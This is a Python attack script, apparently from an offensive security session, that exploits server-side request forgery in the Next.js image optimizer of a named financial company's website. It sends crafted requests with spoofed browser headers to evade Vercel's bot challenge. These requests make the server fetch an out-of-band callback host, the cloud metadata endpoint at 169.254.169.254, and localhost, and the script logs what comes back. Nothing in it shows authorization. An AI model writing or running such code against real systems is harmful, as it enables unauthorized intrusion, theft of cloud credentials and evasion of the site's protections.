#!/usr/bin/env python3
"""SSRF weaponization against Next.js /_next/image optimizer.
Slow, realistic request shape to avoid Vercel BotID challenge; fire OOB callbacks."""
import subprocess, os, time

B = "https://www.infinitycapital.bh"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/" + "1" + "24.0.0.0 Safari/537.36")

H1 = "oob7d001dce6dba.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

def hit(url, label, out):
    r = subprocess.run(
        ["curl", "-sk", "-m", "30", "-A", UA,
         "-H", "Accept: image/avif,image/webp,image/apng,*/*;q=0.8",
         "-H", "Accept-Language: en-US,en;q=0.9",
         "-H", "sec-ch-ua-platform: \"Windows\"",
         "-H", "Sec-Fetch-Dest: image", "-H", "Sec-Fetch-Mode: no-cors",
         "-H", "Sec-Fetch-Site: same-origin",
         "-D", out + ".hdr", "-o", out,
         "-w", "%{http_code} %{size_download} %{content_type}", url],
        capture_output=True, text=True)
    h = open(out + ".hdr", errors="replace").read()
    mit = "deny" if "vercel-mitigated: deny" in h.lower() else (
        "challenge" if "vercel-mitigated: challenge" in h.lower() else "NONE")
    print("%-16s %-30s mit=%-9s" % (label, r.stdout.strip(), mit), flush=True)
    return r.stdout.strip(), mit

cases = [
    ("ssrf_oob",  B + "/_next/image?url=http%3A%2F%2F" + H1 + "%2Fssrf.png&w=640&q=75"),
    ("ssrf_oob2", B + "/_next/image?url=http%3A%2F%2F" + H1 + "%2Fa%3Fb%3Dc.png&w=1080&q=75"),
    ("ssrf_meta", B + "/_next/image?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&w=640&q=75"),
    ("ssrf_local",B + "/_next/image?url=http%3A%2F%2F127.0.0.1%3A80%2F&w=640&q=75"),
]
for label, url in cases:
    hit(url, label, "tool_outputs/ssrf_%s.out" % label)
    time.sleep(3)

# absolute, unencoded variant
hit(B + "/_next/image?url=http://" + H1 + "/raw.png&w=640&q=75",
    "ssrf_raw", "tool_outputs/ssrf_raw.out")
